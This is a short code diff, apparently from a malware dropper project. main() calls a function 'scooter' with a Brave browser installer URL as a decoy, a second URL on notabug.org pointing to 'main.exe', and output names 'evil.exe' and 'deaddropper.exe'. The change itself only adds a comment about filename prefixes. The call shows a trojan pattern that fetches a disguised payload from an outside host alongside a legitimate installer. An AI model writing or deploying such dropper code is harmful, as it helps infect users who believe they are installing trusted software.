@@ -53,5 +53,6 @@ void scooter(LPCTSTR legitimate_app, LPCTSTR legitimate_app_URL, LPCTSTR malware
 }
 
 int main() {
+	//MAKE SURE TO KEEP THE PREPENDED "//" BEFORE ENTERING THE FILENAME
 	scooter("\\BraveBrowserSetUp.exe", "https://notabug.org/dejiy10095/demo/raw/master/BraveBrowserSetup.exe", "https://notabug.org/dejiy10095/demo/raw/master/main.exe", "\\evil.exe", "\\deaddropper.exe");
 }
